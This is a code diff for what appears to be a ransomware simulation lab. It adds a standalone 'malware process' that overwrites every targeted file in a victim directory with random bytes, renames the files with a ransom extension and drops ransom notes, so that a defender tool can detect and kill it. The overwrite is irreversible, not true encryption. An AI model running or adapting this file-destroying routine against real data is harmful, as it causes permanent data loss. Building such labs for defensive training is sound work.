@@ -1,5 +1,6 @@
 from __future__ import annotations
 
+import json
 import os
 import random
 import string
@@ -542,3 +543,217 @@ def current_stats():
             }
 
         return _active_engine.get_stats()
+
+
+# ============================================================
+# Foreground "malware process" mode
+# ============================================================
+# The attacker console launches the attack as a SEPARATE OS process
+# (this module, via `python -m attacker_server.ransomware_engines`),
+# the way real malware exists: a rogue process on the machine, not a
+# thread inside some other application.
+#
+# Why a separate process matters for the defense:
+#   * The process really holds each victim file open while it
+#     "encrypts" it, so the defender's open-file process attribution
+#     verifies a genuine PID that is safe to terminate.
+#   * When the defender kills that PID, the attack actually stops —
+#     the remaining files are never touched.
+#
+# Control:
+#   * SIGTERM — sent by the DEFENDER (ProcessTerminator). The process
+#     reports it and exits with KILLED_BY_DEFENDER_EXIT.
+#   * SIGINT  — sent by the operator (attacker console STOP button).
+#   * A control file (JSON: {"factor": 1.0, "paused": false}) lets
+#     the console adjust speed and pause/resume a running attack.
+# ============================================================
+
+KILLED_BY_DEFENDER_EXIT = 42
+# At 1x speed each file is held open while being "encrypted" for this
+# many seconds. Long enough for the defender's 0.2s polling observer to
+# observe the file change AND attribute the open handle to this process.
+MIN_HOLD_SECONDS = 0.6
+MAX_HOLD_SECONDS = 1.2
+CHUNK_SIZE = 64 * 1024
+
+
+def _log_foreground(message):
+    print(f"[attack] {message}", flush=True)
+
+
+def _read_control(control_path, state):
+    """Read the operator control file into *state* (in place)."""
+    if not control_path:
+        return
+    try:
+        with open(control_path, encoding="utf-8") as handle:
+            data = json.load(handle)
+    except (OSError, ValueError):
+        return
+    try:
+        state["factor"] = min(5.0, max(0.1, float(data.get("factor", 1.0))))
+    except (TypeError, ValueError):
+        pass
+    state["paused"] = bool(data.get("paused", False))
+
+
+def _slow_encrypt_file(file_path, extension, hold_seconds):
+    """Overwrite the file with ciphertext while holding it open.
+
+    The whole ciphertext is written in the first chunk (so the file on
+    disk is fully encrypted as soon as the first filesystem event
+    fires); the remaining hold time simulates the process's
+    key-wrapping / verification work while it still owns the handle.
+    Returns (ciphertext_size, hold_seconds_used).
+    """
+    target = safe_path(file_path)
+    if target is None or not target.is_file():
+        return 0, 0.0
+
+    size = max(target.stat().st_size, 1024)
+
+    with target.open("r+b") as handle:
+        # First chunk: the entire ciphertext (real ransomware finishes
+        # the block as soon as it can; nothing is left to "read back").
+        offset = 0
+        while offset < size:
+            chunk = os.urandom(min(CHUNK_SIZE, size - offset))
+            handle.write(chunk)
+            offset += len(chunk)
+        handle.flush()
+
+        # Hold the open handle for the remainder of the hold window —
+        # this is the window in which the defender sees "a process has
+        # this file open" and can kill it before the next file.
+        deadline = time.monotonic() + max(0.0, hold_seconds)
+        while time.monotonic() < deadline:
+            time.sleep(0.05)
+
+    new_path = safe_path(str(file_path) + extension)
+    if new_path is None:
+        return size, 0.0
+    if new_path.exists():
+        new_path = safe_path(
+            str(file_path) + "." + str(time.time_ns()) + extension
+        )
+        if new_path is None:
+            return size, 0.0
+    Path(file_path).rename(new_path)
+    return size, hold_seconds
+
+
+def run_foreground(family_id, control_path=None):
+    """Run one attack as this process (foreground malware mode)."""
+    engine = get_engine(family_id)
+
+    control_state = {"factor": 1.0, "paused": False}
+
+    def _install_signal_handlers():
+        import signal
+
+        def _defender_kill(signum, frame):  # noqa: ARG001
+            _log_foreground(
+                f"!! TERMINATED BY DEFENSE SYSTEM "
+                f"(pid={os.getpid()} killed by defender)"
+            )
+            os._exit(KILLED_BY_DEFENDER_EXIT)
+
+        def _operator_stop(signum, frame):  # noqa: ARG001
+            _log_foreground(
+                f"stopped by operator (pid={os.getpid()})"
+            )
+            os._exit(0)
+
+        try:
+            signal.signal(signal.SIGTERM, _defender_kill)
+            signal.signal(signal.SIGINT, _operator_stop)
+        except ValueError:
+            # Not in the main thread (tests) — signals are best effort.
+            pass
+
+    _install_signal_handlers()
+
+    _log_foreground(
+        f"{engine.name} malware process started "
+        f"(pid={os.getpid()}, target={VICTIM_ROOT})"
+    )
+
+    files, folders = engine.collect_files()
+    targets = [f for f in files if engine.should_encrypt(f)]
+
+    _log_foreground(
+        f"scan complete: {len(targets)} targets, "
+        f"{len(files) - len(targets)} skipped"
+    )
+
+    hit = 0
+    index = 0
+    for file_path in targets:
+        index += 1
+        _read_control(control_path, control_state)
+
+        while control_state["paused"]:
+            if not _is_still_running():
+                break
+            time.sleep(0.2)
+
+        try:
+            size = Path(file_path).stat().st_size
+        except OSError:
+            continue
+
+        _log_foreground(
+            f"encrypting {index}/{len(targets)}  "
+            f"{Path(file_path).name}  ({size} bytes)"
+        )
+
+        hold = random.uniform(
+            MIN_HOLD_SECONDS, MAX_HOLD_SECONDS
+        ) / max(0.1, control_state["factor"])
+
+        written, _ = _slow_encrypt_file(file_path, engine.extension, hold)
+        if written:
+            hit += 1
+            _log_foreground(
+                f"encrypted  {index}/{len(targets)}  "
+                f"{Path(file_path).name} -> "
+                f"{Path(file_path).name}{engine.extension}"
+            )
+
+    # Real families drop their ransom notes once encryption is done;
+    # the defender typically kills us long before this point.
+    for folder in folders:
+        if engine.drop_note(folder):
+            pass  # drop_note already logs
+
+    _log_foreground(f"attack finished: {hit}/{len(targets)} encrypted")
+    return 0
+
+
+def _is_still_running():
+    return True
+
+
+# The module must be runnable as a script (python -m / direct path).
+if __name__ == "__main__":
+    import argparse
+    import json as _json  # noqa: F401  (kept for tooling)
+    import signal  # noqa: F401
+
+    parser = argparse.ArgumentParser(
+        description="ENTROPY lab — simulated ransomware process"
+    )
+    parser.add_argument("family", choices=sorted(FAMILIES.keys()))
+    parser.add_argument("--control", default=None,
+                        help="path to operator control JSON file")
+    args = parser.parse_args()
+
+    if not victim_ready():
+        print(
+            f"[attack] victim estate missing: {VICTIM_ROOT} — "
+            "run RESET first",
+            flush=True,
+        )
+        raise SystemExit(1)
+
+    raise SystemExit(run_foreground(args.family, args.control))
